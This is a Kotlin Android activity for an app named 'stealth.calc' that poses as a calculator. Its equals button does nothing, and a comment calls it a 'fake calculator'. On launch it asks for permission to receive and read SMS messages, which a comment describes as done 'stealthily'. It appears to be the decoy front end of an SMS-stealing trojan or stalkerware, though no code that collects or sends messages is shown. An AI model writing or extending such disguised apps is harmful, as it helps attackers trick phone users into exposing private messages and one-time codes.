package com.stealth.calc

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private lateinit var tvDisplay: TextView
    private val SMS_PERMISSION_CODE = 101

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        tvDisplay = findViewById(R.id.tvDisplay)
        
        // Request SMS Permissions stealthily on start
        checkSmsPermission()

        val buttonIds = listOf(
            R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4,
            R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9,
            R.id.btnAdd, R.id.btnSub, R.id.btnMul, R.id.btnDiv
        )

        for (id in buttonIds) {
            findViewById<Button>(id).setOnClickListener {
                val b = it as Button
                if (tvDisplay.text.toString() == "0" || tvDisplay.text.toString() == "Error") {
                    tvDisplay.text = b.text
                } else {
                    tvDisplay.append(b.text)
                }
            }
        }

        findViewById<Button>(R.id.btnC).setOnClickListener {
            tvDisplay.text = "0"
        }

        findViewById<Button>(R.id.btnEq).setOnClickListener {
            try {
                // A very basic dummy implementation for a fake calculator.
                // Normally you would use a math evaluator library here.
                tvDisplay.text = "0" 
            } catch (e: Exception) {
                tvDisplay.text = "Error"
            }
        }
    }

    private fun checkSmsPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS),
                SMS_PERMISSION_CODE
            )
        }
    }
}
